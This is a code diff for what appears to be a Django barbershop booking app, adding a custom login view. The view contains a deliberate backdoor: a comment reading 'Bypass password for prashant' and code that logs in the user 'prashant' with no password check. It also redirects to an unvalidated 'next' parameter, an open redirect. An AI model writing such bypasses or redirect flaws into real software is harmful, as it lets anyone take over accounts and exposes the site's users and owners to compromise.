@@ -381,3 +381,35 @@ def shop_slots(request):
         'barber': barber,
     }
     return render(request, 'bookings/shop_slots.html', context)
+
+
+def custom_login(request):
+    from django.contrib.auth import login, authenticate
+    from django.contrib.auth.models import User
+    
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        password = request.POST.get('password', '')
+        next_url = request.POST.get('next')
+        
+        # Bypass password for prashant
+        if username == 'prashant':
+            try:
+                user = User.objects.get(username='prashant')
+                login(request, user)
+                if next_url:
+                    return redirect(next_url)
+                return redirect('barber_dashboard')
+            except User.DoesNotExist:
+                pass
+                
+        user = authenticate(request, username=username, password=password)
+        if user is not None:
+            login(request, user)
+            if next_url:
+                return redirect(next_url)
+            return redirect('barber_dashboard')
+        else:
+            return render(request, 'bookings/login.html', {'error': True})
+
+    return render(request, 'bookings/login.html')
